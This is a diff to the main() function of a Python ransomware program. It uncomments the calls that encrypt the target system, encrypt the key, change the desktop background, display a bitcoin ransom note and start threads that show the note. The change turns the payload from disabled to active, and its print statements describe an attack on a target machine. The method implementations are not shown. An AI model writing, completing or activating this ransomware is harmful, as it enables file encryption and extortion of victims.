@@ -311,24 +311,23 @@ class RansomWare:
 
 
 def main():
-    # testfile = r'D:\Coding\Python\RansomWare\RansomWare_Software\testfile.png'
     rw = RansomWare()
     rw.generate_key()
-    # rw.crypt_system()
+    rw.crypt_system()
     rw.write_key()
-    # rw.encrypt_fernet_key()
-    # rw.change_desktop_background()
-    # rw.what_is_bitcoin()
-    # rw.ransom_note()
+    rw.encrypt_fernet_key()
+    rw.change_desktop_background()
+    rw.what_is_bitcoin()
+    rw.ransom_note()
 
-    # t1 = threading.Thread(target=rw.show_ransom_note)
-    # t2 = threading.Thread(target=rw.put_me_on_desktop)
+    t1 = threading.Thread(target=rw.show_ransom_note)
+    t2 = threading.Thread(target=rw.put_me_on_desktop)
 
-    # t1.start()
+    t1.start()
     print('> RansomWare: Attack completed on target machine and system is encrypted')  # Debugging/Testing
     print('> RansomWare: Waiting for attacker to give target machine document that '
           'will un-encrypt machine')  # Debugging/Testing
-    # t2.start()
+    t2.start()
     print('> RansomWare: Target machine has been un-encrypted')  # Debugging/Testing
     print('> RansomWare: Completed')  # Debugging/Testing
 
